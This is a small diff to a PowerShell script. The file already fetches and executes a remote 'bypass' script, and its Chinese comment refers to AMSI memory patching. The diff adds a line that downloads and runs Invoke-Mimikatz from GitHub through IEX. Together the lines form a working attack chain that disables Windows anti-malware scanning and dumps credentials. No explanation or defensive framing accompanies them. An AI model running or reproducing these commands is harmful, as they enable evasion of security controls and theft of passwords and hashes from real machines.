@@ -1,6 +1,7 @@
 
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt")
 
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1")
 
 #amsi内存修补
 
